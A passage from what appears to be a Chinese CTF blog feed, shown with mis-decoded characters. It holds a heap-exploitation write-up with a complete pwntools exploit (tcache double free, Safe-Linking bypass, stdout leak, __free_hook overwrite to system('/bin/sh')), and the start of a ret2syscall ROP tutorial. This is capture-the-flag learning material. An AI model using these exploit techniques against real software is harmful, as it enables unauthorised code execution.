†å—ï¼Œåªèƒ½é‡Šæ”¾ç´¢å¼•ä¸º <code>idx</code> çš„å †å—ï¼ˆä¹Ÿå°±æ˜¯åªèƒ½é‡Šæ”¾æœ€è¿‘ä¸€æ¬¡ç”³è¯·çš„å †å—ï¼‰</p><p><code>show</code> å‡½æ•°ä¹Ÿæ˜¯åªèƒ½æ‰“å°å‡ºæœ€è¿‘ä¸€æ¬¡ç”³è¯·å †å—ä¸­çš„å…«ä¸ªå­—èŠ‚æ•°æ®ï¼Œå¹¶ä¸” <code>show</code> å‡½æ•°åªæœ‰ä¸€æ¬¡æ‰§è¡Œçš„æœºä¼š </p><p><code>edit</code> å‡½æ•°åªèƒ½å‘æœ€è¿‘ä¸€æ¬¡å †å—ä¸­å†™å…¥ <code>0x10</code> å­—èŠ‚çš„æ•°æ®ï¼Œå¹¶ä¸” <code>edit</code> å‡½æ•°åªèƒ½æ‰§è¡Œä¸¤æ¬¡</p><h5 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h5><p>å› ä¸ºæœ¬é¢˜ä¸€ä¸ªéº»çƒ¦çš„ç‚¹åœ¨äº <code>edit</code> <code>show</code> <code>delete</code> å‡½æ•°éƒ½åªèƒ½å¯¹æœ€è¿‘ä¸€ä¸ªç”³è¯·å‡ºæ¥çš„å †å—æ“ä½œï¼Œæ‰€ä»¥éœ€è¦åå¤è°ƒè¯•è¿›è¡Œä¸€ä¸ªå¸ƒå±€ã€‚</p><p><code>add</code> å‡½æ•°æœ€å¤§ç”³è¯· <code>0x80</code> çš„å †å—ï¼Œè¿™å°±å¯¼è‡´äº†æ³„éœ² <code>libc</code> åœ°å€æ³„éœ²ä¸å‡ºæ¥ï¼ˆå³ä½¿å¡«æ»¡ <code>tcache bin</code> å› ä¸ºè¿˜éœ€è¦åšä¸€ä¸ªé˜»æ­¢ä¸ <code>top chunk</code> åˆå¹¶çš„å †å—ï¼Œä¹Ÿæ˜¯æ— æ³•å°† <code>libc</code> æ³„éœ²å‡ºæ¥çš„ï¼Œå°±ç®—çœŸçš„æ³„éœ²å‡ºæ¥è¿˜è¦è€ƒè™‘ <code>safe-Linking</code> ï¼‰</p><p>æ‰€ä»¥è¿™é‡Œæœ€ç»ˆé€‰æ‹©çš„æ˜¯æ³„éœ² <code>heap</code> åœ°å€ï¼Œåˆ©ç”¨ <code>UAF</code> åŠ ä¸Š <code>show</code> å‡½æ•°å³å¯æ³„éœ²å †åœ°å€ï¼ˆå°†æ³„éœ²å‡ºæ¥çš„æ•°æ®å·¦ç§» <code>12</code> ä½ï¼‰</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ <code>edit</code> å‡½æ•°å¯ä»¥å†™å…¥ <code>0x10</code> ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œè¿™æ ·å¯ä»¥ç¯¡æ”¹ <code> free</code> çŠ¶æ€å †å—çš„ <code>key</code> å­—æ®µï¼Œç»™äº†æˆ‘ä»¬ <code>double free</code> çš„æœºä¼šï¼Œç›®çš„æ˜¯å»å°† <code>pthread_tcache_struct</code> ç”³è¯·å‡ºæ¥ï¼ˆæ­¤æ—¶ä¸¤æ¬¡ <code>edit</code> æœºä¼šå·²ç»ç”¨å®Œï¼‰</p><p>ä¹‹åæ³„éœ² <code>libc</code> è‚¯å®šè¦è€ƒè™‘æ®‹ç•™ä¸€ä¸ª <code>main_arena+96</code> åœ°å€ï¼Œç„¶åçˆ†ç ´ç”³è¯· <code>_IO_2_1_stdout_</code> ç»“æ„ä½“æ³„éœ² <code>libc</code> ã€‚æœ¬é¢˜å †å—å³ä½¿å¡«æ»¡ <code>tcache bin</code> ä¹Ÿä¼šè½å…¥ <code>fast bin</code> ä¸­ï¼ˆ<code>0x90</code> è™½ç„¶è½ä¸è¿›å»ï¼Œä½†äº§ç”Ÿäº† <code>main_arena+96</code> ä¹Ÿæ²¡åŠæ³•æ”¹ä¸º <code>_IO_2_1_stdout_</code> åœ°å€ï¼‰</p><p>æ‰€ä»¥åªèƒ½å°† <code>pthread_tcache_struct</code> é‡Šæ”¾æ‰è¿›å…¥ <code>unsorted bin</code> ï¼Œå½“æˆ‘ä»¬æ¯æ¬¡å»ä» <code>unsorted bin</code> ä¸­åˆ‡å‰²å †å—çš„æ—¶å€™ï¼Œéƒ½ä¼šæ®‹ç•™ <code>main_arena+96</code> åœ¨ <code>pthread_tcache_struct</code> ä¸­ï¼Œå½“ <code>main_arena+96</code> æ­£å¥½è½åˆ° <code>tcache</code> å¤´æŒ‡é’ˆçš„ä½ç½®ï¼Œæˆ‘ä»¬å†åˆ‡å‰² <code>unsorted bin</code> çš„æ—¶å€™å°±èƒ½ç¯¡æ”¹ <code>main_arena+96</code> æ”¹ä¸º <code>_IO_2_1_stdout</code> åœ°å€äº†ã€‚</p><p>æ³¨æ„ï¼šä» <code>tcache bin</code> ä¸­ç”³è¯·å †å—å‡ºæ¥éœ€è¦ä¿è¯ <code>counts &gt; 0</code> ï¼Œä¸ºäº†æœ€åè¿˜æœ‰æœºä¼šåšä¸€ä¸ª <code>__free_hook</code> ç”³è¯·å‡ºæ¥ï¼Œæˆ‘ä»¬å¿…é¡»è®©ç”³è¯·å‡ºæ¥çš„å †å—å°½å¯èƒ½å°ï¼ˆåœ¨åé¢å †å—å¸ƒå±€çš„æ—¶å€™å°±ä¼šå‘ç°è¿™ç‚¹ï¼‰</p><h5 id="è°ƒè¯•è¿‡ç¨‹"><a href="#è°ƒè¯•è¿‡ç¨‹" class="headerlink" title="è°ƒè¯•è¿‡ç¨‹"></a>è°ƒè¯•è¿‡ç¨‹</h5><p>è°ƒè¯•è¿‡ç¨‹ä¸»è¦æ¼”ç¤ºå¦‚ä½•å°† <code>__IO_2_1_stdout</code> å’Œ <code>__free_hook</code> ç”³è¯·å‡ºæ¥</p><p>ä¸‹å›¾æ˜¯ç”³è¯· <code>pthread_tcache_struct</code> å‰çš„æƒ…å†µï¼Œç”³è¯·å‡ºæ¥è¦å†™å…¥ <code>b&#39;\x00\x00&#39; * 0x27 + b&#39;\x07\x00&#39;</code> ï¼Œè¿™æ ·æ­£å¥½å°† <code>0x290</code> è¿™æ¡é“¾çš„ <code>counts</code> è®¾ç½®ä¸º <code>7</code>ï¼Œä¿è¯äº†é‡Šæ”¾æ‰ <code>pthread_tcache_struct</code> åå¯ä»¥è¿›å…¥ <code>unsorted bin</code></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202028776.png" alt="image-20230320202839431" style="zoom: 50%;" /><p>ä¸‹å›¾æ˜¯ <code>pthread_tcache_struct</code> è¿›å…¥äº† <code>unsorted bin</code> ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åå¤ä» <code>unsorted bin</code> é‡Œæ¥åˆ‡å †å—</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202032910.png" alt="image-20230320203243312" style="zoom:50%;" /><p>æˆ‘ä»¬ç¬¬ä¸€ä¸ªè¦åˆ‡ä¸‹æ¥çš„å †å—å¤§å°ä¸º <code>0x40</code>ï¼Œå†™å…¥çš„æ•°æ®ä¸º <code>&#39;\x00\x00&#39;*3+&#39;\x01\x00&#39;*1+&#39;\x00\x00&#39;*2+&#39;\x01\x00&#39;+&#39;\x00&#39;*0x38</code> ï¼Œè¿™æ ·æ‰å¯ä»¥è®© <code>0x50</code> å’Œ <code>0x80</code> è¿™ä¸¤æ¡é“¾ä¸Šçš„ <code>counts</code> ä¸º <code>1</code>ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼ˆè¿™é‡Œå°±æ˜¯ä¸€ä¸ªå¸ƒå±€ï¼Œä¸ºåé¢ç”³è¯· <code>_IO_2_1_stdout</code> å’Œ <code>__free_hook</code> åšå‡†å¤‡ï¼‰</p><p>è‡ªå·±åšé¢˜çš„æ—¶å€™ï¼Œè¿™é‡Œè‚¯å®šä¸æ˜¯ç¬¬ä¸€æ¬¡å°±èƒ½å†™å‡ºæ¥çš„ï¼Œç­‰è°ƒè¯•åˆ°åé¢å‘ç°è¿™é‡Œéœ€è¦æ„é€  <code>counts</code> ï¼Œæ‰æ‹å›æ¥å¸ƒç½®çš„ï¼ŒåŒ…æ‹¬ç”³è¯·çš„å †å—å¤§å°ä¸º <code>0x40</code> ä¹Ÿæ˜¯åå¤è°ƒè¯•æ›´æ”¹åç¡®å®šçš„ã€‚æ€»ç»“ä¸€ä¸‹å°±æ˜¯è¿™äº›æ•°æ®éƒ½æ˜¯è°ƒè¯•å¾—æ¥çš„ã€‚</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202035978.png" alt="image-20230320203552375" style="zoom:50%;" /><p>å†æ¬¡ç”³è¯·ä¸€ä¸ª <code>0x30</code> å †å—ï¼Œè¿™æ¬¡å‘é€çš„æ•°æ®å…¨éƒ¨å¡«å†™ <code>\x00</code> å³å¯ï¼Œæ­¤æ—¶ <code>pthread_tcache_struct</code> ä¸­å·²ç»æ®‹ç•™äº†è¢«åˆ‡å‰²åçš„ <code>main_arena+96</code> ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202041239.png" alt="image-20230320204130712" style="zoom:50%;" /><p>ç”³è¯·ä¸€ä¸ª <code>0x10</code> çš„å †å—ï¼Œå†™å…¥æ•°æ®ä¸º <code>\xc0\x16</code> ï¼ˆè¿™æ˜¯ <code>_IO_2_1_stdout_</code> çš„åä¸¤å­—èŠ‚ï¼Œä¸è¿‡ç¬¬ä¸€ä½éœ€è¦çˆ†ç ´ï¼‰ï¼Œå†™å…¥çš„æ•°æ®ä¼šæ­£å¥½è½åœ¨åˆšåˆšæ®‹ç•™çš„ <code>main_arena+96</code> ä¸Šï¼Œä»è€Œäº§ç”Ÿäº† <code>_IO_2_1_stdout_</code> åœ°å€ï¼Œå¹¶ä¸” <code>0x50</code> è¿™æ¡é“¾çš„ <code>counts</code> å·²ç»è¢«è®¾ç½®ä¸º <code>1</code>  äº†ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥ç”³è¯·å‡ºæ¥çš„ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202045688.png" alt="image-20230320204516358" style="zoom:50%;" /><p><code>io leak</code> å°±ä¸è¯´äº† æ­¤å¤„<code>exp</code> çš„ä»£ç ä¸º </p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p> å…·ä½“åšæ³•è¯·å‚è€ƒ <a href="https://zikh26.github.io/posts/a9dd00f0.html">æ–‡ç« </a> ï¼Œç°åœ¨æˆ‘ä»¬å·²ç»æ‹¿åˆ°äº† <code>libc</code> åœ°å€å¹¶ä¸” <code>bins</code> çš„æƒ…å†µå¦‚ä¸‹</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202052487.png" alt="image-20230320205222092" style="zoom:50%;" /><p>ç”³è¯·ä¸€ä¸ª <code>0x10</code> çš„å †å—ï¼Œå†™å…¥ <code>__free_hook</code> çš„åœ°å€ï¼Œè¯¥åœ°å€ä¼šæ­£å¥½è½åœ¨ <code>0x80</code> çš„ <code>tcache</code> å¤´ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œ<code>__free_hook</code> ä¸ºä»€ä¹ˆä¼šæ­£å¥½è½åœ¨è¿™é‡Œï¼Ÿ   åˆ«é—®ï¼Œé—®å°±æ˜¯å¸ƒå±€ â—•â€¿â—•</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202055913.png" alt="image-20230320205508486" style="zoom:50%;" /><p>å› ä¸ºä¹‹å‰å·²ç»å°† <code>0x80</code> è¿™æ¡é“¾çš„ <code>counts</code> è®¾ç½®ä¸º <code>1</code>ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å°† <code>__free_hook</code> ç”³è¯·å‡ºæ¥ï¼Œç„¶åå†™å…¥ <code>system</code> åœ°å€ã€‚ç„¶åè§‚å¯Ÿ <code>0x20</code> è¿™æ¡é“¾æ˜¯æ²¡æœ‰ä»»ä½•æ•°æ®çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”³è¯·ä¸€ä¸ª <code>0x20</code> çš„å †å—å­˜å…¥ <code>/bin/sh</code> å†å°†å…¶é‡Šæ”¾ï¼Œå³å¯è·å– <code>shell</code></p><p>æœ¬é¢˜æ³¨æ„çš„å‡ ç‚¹ï¼š</p><ol><li>å¾ˆå¤šçœ‹ä¼¼é¡ºç†æˆç« çš„å¸ƒå±€ï¼Œå…¶å®éƒ½æ˜¯åå¤è°ƒè¯•å‡ºæ¥çš„</li><li><code>counts</code> ä¸º <code>0</code> çš„æ—¶å€™ï¼Œä» <code>tcache bin</code> ä¸­ç”³è¯·ä¸å‡ºæ¥å †å—</li><li><code>counts</code> å¤§äº <code>0</code> çš„æ—¶å€™ï¼Œå¦‚æœé‡Œé¢çš„å€¼ä¸æ˜¯ä¸€ä¸ªåˆæ³•åœ°å€ï¼Œåˆ™ç”³è¯·æ—¶ä¼šæŠ¥é”™</li><li>ä¸ºäº†æ‰“æœ€åçš„ <code>tcache poisoning</code> ï¼Œå¿…é¡»è¦è®©æ¯æ¬¡ç”³è¯·å †å—çš„ <code>size</code> å°½å¯èƒ½çš„å°ï¼Œè¿™æ ·æ‰èƒ½è®© <code>__free_hook</code> è½åœ¨ <code>0x80</code> ï¼Œå†å¾€åçš„è¯å› ä¸ºå¯¹ <code>add</code> å‡½æ•°ä¸­å¯¹  <code>size</code> æ£€æŸ¥çš„åŸå› ï¼Œå°±ç”³è¯·ä¸å‡ºæ¥äº†</li><li>å¾€ <code>pthread_tcache_struct</code> ä¸­å†™å…¥æ•°æ®æ—¶ï¼Œå°½å¯èƒ½çš„å†™å…¥ <code>\x00</code> ï¼Œä¸ç„¶å¯èƒ½ä¼šç ´åæŸäº› <code>tcache bin</code> çš„ <code>counts</code></li></ol><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><p><a href="https://zikh26.github.io/posts/ad411136.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26738&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:\n&quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">edit(p64(((heap_base+<span class="number">0x2a0</span>)&gt;&gt;<span class="number">12</span>)^(heap_base+<span class="number">0x10</span>)))</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">b&#x27;\x00\x00&#x27;</span> * <span class="number">0x27</span> + <span class="string">b&#x27;\x07\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;\x00\x00&#x27;</span>*<span class="number">3</span>+<span class="string">&#x27;\x01\x00&#x27;</span>*<span class="number">1</span>+<span class="string">&#x27;\x00\x00&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;\x01\x00&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;\xc0\x16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x1e4744</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xE86</span>,<span class="number">0xE6D</span>,<span class="number">0xE5E</span>,<span class="number">0xED5</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x70</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303201357465.png" alt="image-20230320135639350"></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Safe-Linking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2syscallçš„åšé¢˜æ€è·¯</title>
      <link href="/posts/10ff9a38.html"/>
      <url>/posts/10ff9a38.html</url>
      
        <content type="html"><![CDATA[<p>â€‹ret2syscalléœ€è¦å¯»æ‰¾çš„æŒ‡ä»¤çš„æ€è·¯å’Œæ„é€ shellcodeçš„æ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡ret2syscallè·å–çš„æŒ‡ä»¤ç®—æ˜¯å°±åœ°å–æï¼Œè€Œret2shellcodeåˆ›é€ æŒ‡ä»¤ç®—æ˜¯æ— ä¸­ç”Ÿæœ‰ã€‚åœ¨32ä½ç¨‹åºä¸­ï¼Œæˆ‘ä»¬è¦ç³»ç»Ÿè°ƒç”¨ï¼Œé‚£å°±éœ€è¦æŠŠç³»ç»Ÿè°ƒç”¨å·ä¼ å…¥eaxå¯„å­˜å™¨ï¼Œç„¶åéœ€è¦æŠŠecxå’Œedxçš„å¯„å­˜å™¨ç»™æ¸…ç©ºã€‚æœ€åå°±æ˜¯éœ€è¦å»æŠŠå‚æ•°&#x2F;bin&#x2F;shçš„åœ°å€å­˜å…¥ebxå¯„å­˜å™¨ã€‚è€Œæˆ‘æ„Ÿè§‰ret2syscallçš„éš¾ç‚¹ä¹Ÿå°±æ˜¯åœ¨æœ€åè¿™ä¸ªæŠŠå‚æ•°åœ°å€å­˜å…¥ebxå¯„å­˜å™¨è¿™é‡Œäº†ã€‚</p><h1 id="æ€ä¹ˆæŠŠå‚æ•°-x2F-bin-x2F-shå†™å…¥ç¨‹åºä¸­ï¼Ÿå†™åˆ°å“ªï¼Ÿ"><a href="#æ€ä¹ˆæŠŠå‚æ•°-x2F-bin-x2F-shå†™å…¥ç¨‹åºä¸­ï¼Ÿå†™åˆ°å“ªï¼Ÿ" class="headerlink" title="æ€ä¹ˆæŠŠå‚æ•°&#x2F;bin&#x2F;shå†™å…¥ç¨‹åºä¸­ï¼Ÿå†™åˆ°å“ªï¼Ÿ"></a>æ€ä¹ˆæŠŠå‚æ•°&#x2F;bin&#x2F;shå†™å…¥ç¨‹åºä¸­ï¼Ÿå†™åˆ°å“ªï¼Ÿ</h1><h2 id="â‘ å†™åˆ°å“ª"><a href="#â‘ å†™åˆ°å“ª" class="headerlink" title="â‘ å†™åˆ°å“ª"></a>â‘ å†™åˆ°å“ª</h2><p>é¦–å…ˆå›ç­”å†™åˆ°å“ªï¼Œ<strong>æˆ‘ä»¬è¦å°½å¯èƒ½å†™åˆ°bssæ®µ</strong>ï¼Œå› ä¸ºåœ¨ä¸å¼€pieçš„æƒ…å†µä¸‹ï¼Œ<strong>bssæ®µçš„åœ°å€æ˜¯ä¸ä¼šå˜çš„</strong>ï¼Œè¿™æ„å‘³ç€ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨IDAçœ‹ä¸€ä¸‹bssæ®µçš„åœ°å€ç„¶åé€‰å®šä¸€ä¸ªæˆ‘ä»¬å†™å…¥å‚æ•°çš„åœ°å€ï¼Œç„¶åæˆ‘ä»¬expå°±å¯ä»¥ç›´æ¥å†™ä¸Šè¿™ä¸ªåœ°å€äº†ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³å†™åˆ°æ ˆé‡Œé¢ï¼Œç¡®å®ç”¨gdbä¹Ÿå¯ä»¥çœ‹åˆ°å†™åœ¨äº†å“ªä¸ªå†…å­˜å•å…ƒé‡Œé¢ï¼Œä½†æ˜¯è¿™ä¸ªåœ°å€æ˜¯ä¼šå˜çš„ï¼ŒæŠŠexpä¸Šå†™å…¥æˆ‘ä»¬åˆšæ‰ç”¨gdbçœ‹åˆ°çš„åœ°å€ã€‚è§£å†³åŠæ³•ä¹Ÿæœ‰ï¼Œé‚£å°±æ˜¯éœ€è¦æ³„éœ²ç¨‹åºçš„ä¸€ä¸ªå†…å­˜å•å…ƒåœ°å€ï¼Œç„¶ååˆ©ç”¨åç§»ï¼Œæ¥è®¡ç®—å‡ºæˆ‘ä»¬å­˜æ”¾&#x2F;bin&#x2F;shå‚æ•°çš„åœ°å€ã€‚ä½†æ˜¯è¿™æ ·å¤šå°‘æœ‰ç‚¹éº»çƒ¦ï¼Œå¹¶ä¸”å¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬æ˜¯æ— æ³•æ³„éœ²ç¨‹åºä¸­çš„åœ°å€çš„ï¼Œå› æ­¤æˆ‘ä»¬é€‰æ‹©å†™åˆ°bssæ®µã€‚</p><h2 id="â‘¡æ€ä¹ˆå†™"><a href="#â‘¡æ€ä¹ˆå†™" class="headerlink" title="â‘¡æ€ä¹ˆå†™"></a>â‘¡æ€ä¹ˆå†™</h2><p>å†å›ç­”ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæ€ä¹ˆå†™å…¥ç¨‹åºä¸­?ç›®å‰æˆ‘é‡è§äº†ä¸¤ç§é¢˜å‹ï¼Œåˆ†åˆ«å¯¹åº”çš„ä¸¤ç§æ–¹æ³•ã€‚</p><h3 id="æ€ä¹ˆå†™â€”â€”ç¬¬ä¸€ç§æ–¹æ³•"><a href="#æ€ä¹ˆå†™â€”â€”ç¬¬ä¸€ç§æ–¹æ³•" class="headerlink" title="æ€ä¹ˆå†™â€”â€”ç¬¬ä¸€ç§æ–¹æ³•"></a>æ€ä¹ˆå†™â€”â€”ç¬¬ä¸€ç§æ–¹æ³•</h3><p><strong>ç¬¬ä¸€ç§æ–¹æ³•æ˜¯å»æœç´¢gadgetï¼Œå¯»æ‰¾pop [ecx]è¿™ç±»å¯¹åœ°å€å†…å®¹æ“ä½œçš„æŒ‡ä»¤</strong>ã€‚ç„¶åæˆ‘ä»¬åˆ©ç”¨å¦‚ä¸‹payloadå¯ä»¥è¾¾åˆ°å°†å‚æ•°&#x2F;bin&#x2F;shå†™å…¥bssæ®µã€‚ï¼ˆ<em>å¹¶ä¸”è¿™éƒ¨åˆ†çš„payloadéœ€è¦æ”¾åˆ°è¿”å›åœ°å€å¤„ä½¿ç”¨</em>ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=p32(pop_ecx_addr)+p32(bss_addr)+p32(pop_[ecx]_addr)+<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="number">4</span>)+p32(pop_[ecx]_addr)+<span class="string">&#x27;/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>æˆ‘å…ˆæ¥è§£é‡Šä¸€ä¸‹è¿™ä¸ªpayloadã€‚</p><p>é¦–å…ˆpop_ecx_addræŒ‡çš„æ˜¯pop ecx;retè¿™ä¸ªæŒ‡ä»¤çš„åœ°å€   bss_addræŒ‡çš„å°†å‚æ•°å†™å…¥bssæ®µçš„å…·ä½“åœ°å€</p><p>pop_[ecx]_addræŒ‡çš„æ˜¯pop dword ptr [ecx];retè¿™ä¸ªæŒ‡ä»¤çš„åœ°å€ (è¿™é‡Œæˆ‘å†™[ecx]æ˜¯ä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œæˆ‘è®°å¾—å®é™…çš„expé‡Œé¢ï¼Œä¸èƒ½ä½¿ç”¨æ–¹æ‹¬å·ï¼‰ï¼ˆå¦å¤–è¿™é‡Œä¸ä¸€å®šè¦æ˜¯ecxï¼Œåˆ«çš„å¯„å­˜å™¨ä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œåªæ˜¯ä¸¾ä¸ªä¾‹å­ï¼‰ç„¶åå‚æ•°&#x2F;binå°±æ˜¯æˆ‘ä»¬çš„å‚æ•°</p><p><strong>è‡³äºè¿™ä¸ªbss_addr+4æ˜¯ä¸Šé¢bss_addrçš„åœ°å€çš„è¡”æ¥ï¼Œå› ä¸ºå‚æ•°&#x2F;bin&#x2F;shéœ€è¦ä¸¤ä¸ªå†…å­˜å•å…ƒå­˜æ”¾ï¼Œå› æ­¤åœ¨è¿™é‡Œå°†ä¸Šé¢çš„åœ°å€åŠ 4ï¼Œå°±å­˜åˆ°äº†ä¸‹é¢çš„å†…å­˜å•å…ƒ</strong>ã€‚æœ€åçš„\x00æ˜¯ç”¨æ¥å£°æ˜å­—ç¬¦ä¸²çš„ç»“æŸã€‚</p><p>ä¸‹é¢æˆ‘ç”»å›¾æ¥æ¼”ç¤ºä¸‹è¿™ä¸ªè¿‡ç¨‹æ˜¯æ€ä¹ˆå®ç°çš„</p><p><img src="/../img/2706180-20220127203642840-2033345372.png"></p><p><em>ä½†æ˜¯è¿™æ ·æœå¯»gadgetçš„æ‰‹æ®µï¼Œæ˜¯æœ‰å¼Šç«¯çš„ï¼Œå› ä¸ºæœ‰æ—¶å€™ç¨‹åºå¯èƒ½æ°å¥½å°±æ²¡æœ‰ç±»ä¼¼äºpop [ecx]è¿™æ ·çš„æŒ‡ä»¤ã€‚</em></p><h3 id="æ€ä¹ˆå†™â€”â€”ç¬¬äºŒç§æ–¹æ³•"><a href="#æ€ä¹ˆå†™â€”â€”ç¬¬äºŒç§æ–¹æ³•" class="headerlink" title="æ€ä¹ˆå†™â€”â€”ç¬¬äºŒç§æ–¹æ³•"></a>æ€ä¹ˆå†™â€”â€”ç¬¬äºŒç§æ–¹æ³•</h3><p>å› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨ç¬¬äºŒç§æ–¹æ³•ï¼Œç­‰åˆ°å¯ä»¥æº¢å‡ºçš„æ—¶å€™ï¼Œç”¨ropï¼Œå…ˆå»æŠŠè¿”å›åœ°å€å¤„æ”¾ç½®ä¸€ä¸ªreadå‡½æ•°ï¼Œç„¶åå†æŠŠ&#x2F;bin&#x2F;shå†™å…¥æŒ‡å®šçš„åœ°å€ï¼ˆæŠŠè¯¥åœ°å€æ”¾åœ¨readå‡½æ•°ç¬¬äºŒä¸ªå‚æ•°å³å¯ï¼‰ç„¶åå†éšä¾¿æ‰¾ä¸€ä¸ªè¿ç»­ä¸‰æ¬¡popçš„æŒ‡ä»¤ï¼ˆä¸è¿ç»­åº”è¯¥ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œåæ­£å°±è¦è¿›è¡Œä¸‰æ¬¡popï¼Œå°†readå‡½æ•°çš„ä¸‰ä¸ªå‚æ•°å…ˆä»æ ˆé¡¶ç»™å¼¹å‡ºæ¥ï¼‰<br>æ¥ç€å†è¿›è¡Œret2syscallï¼Œå‚æ•°ä¼ 